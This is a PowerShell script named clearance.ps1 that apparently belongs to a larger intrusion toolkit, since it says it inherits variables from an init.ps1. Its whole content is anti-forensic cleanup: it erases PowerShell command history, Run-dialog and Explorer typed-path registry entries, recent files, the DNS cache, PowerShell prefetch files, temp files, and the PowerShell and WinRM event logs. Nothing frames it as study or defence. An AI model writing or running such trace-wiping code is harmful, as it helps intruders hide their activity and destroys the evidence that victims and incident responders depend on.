# clearance.ps1 - wipe execution traces, inherits $H, $P, $AU, $TH from init.ps1

# ── PowerShell history file ───────────────────────────────
$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $hist) {
    Clear-Content $hist -ErrorAction SilentlyContinue
}

# ── Current session history ───────────────────────────────
Clear-History -ErrorAction SilentlyContinue

# ── Run dialog MRU (Win+R history) ───────────────────────
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" `
                    -Name * -ErrorAction SilentlyContinue

# ── Explorer typed paths ──────────────────────────────────
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" `
                    -Name * -ErrorAction SilentlyContinue

# ── Recent files ─────────────────────────────────────────
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue

# ── DNS cache ─────────────────────────────────────────────
Clear-DnsClientCache -ErrorAction SilentlyContinue

# ── Prefetch (requires admin) ─────────────────────────────
Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue

# ── Event logs (requires admin) ───────────────────────────
$logs = @(
    "Microsoft-Windows-PowerShell/Operational",
    "Windows PowerShell",
    "Microsoft-Windows-WinRM/Operational"
)
foreach ($log in $logs) {
    try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log) } catch {}
}

# ── Temp files ────────────────────────────────────────────
Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
